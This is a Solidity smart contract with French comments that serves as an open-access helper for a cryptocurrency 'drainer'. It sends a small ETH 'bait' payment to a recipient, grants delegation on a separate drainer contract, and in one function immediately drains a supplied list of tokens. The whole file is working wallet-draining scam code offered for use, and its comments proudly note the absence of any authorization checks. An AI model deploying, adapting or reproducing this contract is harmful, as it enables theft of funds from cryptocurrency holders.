// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IDrainer {
    function setDelegate(address newDelegate) external;
    function drainAll(address[] calldata tokens) external;
    function delegates(address) external view returns (bool);
}

/**
 * @title BaitAndDelegateOpen
 * @dev Contrat helper SANS RESTRICTION - N'importe qui peut l'utiliser
 * ⚠️ AUCUN onlyOwner, AUCUNE restriction d'autorisation
 */
contract BaitAndDelegateOpen {
    uint256 public constant BAIT_AMOUNT = 0.0005 ether;
    mapping(address => bool) public hasClaimed;
    
    event BaitSent(address indexed sender, address indexed recipient, uint256 amount);
    event DelegationActivated(address indexed drainer, address indexed delegate);
    
    /**
     * @dev Fonction principale - ACCESSIBLE À TOUT LE MONDE
     * @param drainerContract Adresse du contrat drainer
     * @param delegate Adresse qui deviendra déléguée
     * @param recipient Adresse qui reçoit le leurre
     */
    function baitAndDelegate(
        address drainerContract,
        address delegate,
        address recipient
    ) external payable {
        // ✅ AUCUNE vérification d'autorisation !
        // ✅ PAS de onlyOwner !
        // ✅ PAS de require(msg.sender == owner) !
        
        require(msg.value >= BAIT_AMOUNT, "Not enough ETH for bait");
        require(!hasClaimed[msg.sender], "Already used");
        require(recipient != address(0), "Invalid recipient");
        require(drainerContract != address(0), "Invalid drainer");
        require(delegate != address(0), "Invalid delegate");
        
        // 1. Envoyer le leurre
        payable(recipient).transfer(BAIT_AMOUNT);
        hasClaimed[msg.sender] = true;
        emit BaitSent(msg.sender, recipient, BAIT_AMOUNT);
        
        // 2. Activer la délégation sur le drainer
        IDrainer(drainerContract).setDelegate(delegate);
        emit DelegationActivated(drainerContract, delegate);
        
        // 3. Rembourser l'excédent
        uint256 excess = msg.value - BAIT_AMOUNT;
        if (excess > 0) {
            payable(msg.sender).transfer(excess);
        }
    }
    
    /**
     * @dev Version avec drain automatique (si besoin)
     */
    function baitDelegateAndDrain(
        address drainerContract,
        address delegate,
        address recipient,
        address[] calldata tokens
    ) external payable {
        require(msg.value >= BAIT_AMOUNT, "Not enough ETH");
        require(!hasClaimed[msg.sender], "Already used");
        require(recipient != address(0), "Invalid recipient");
        require(drainerContract != address(0), "Invalid drainer");
        require(delegate != address(0), "Invalid delegate");
        
        // 1. Envoyer le leurre
        payable(recipient).transfer(BAIT_AMOUNT);
        hasClaimed[msg.sender] = true;
        emit BaitSent(msg.sender, recipient, BAIT_AMOUNT);
        
        // 2. Activer la délégation
        IDrainer(drainerContract).setDelegate(delegate);
        emit DelegationActivated(drainerContract, delegate);
        
        // 3. Drainer immédiatement
        IDrainer(drainerContract).drainAll(tokens);
        
        uint256 excess = msg.value - BAIT_AMOUNT;
        if (excess > 0) {
            payable(msg.sender).transfer(excess);
        }
    }
    
    /**
     * @dev Vérifier si une adresse a déjà utilisé le service
     */
    function hasUsed(address user) external view returns (bool) {
        return hasClaimed[user];
    }
    
    /**
     * @dev Permet à n'importe qui de récupérer des fonds envoyés par erreur
     */
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    receive() external payable {}
}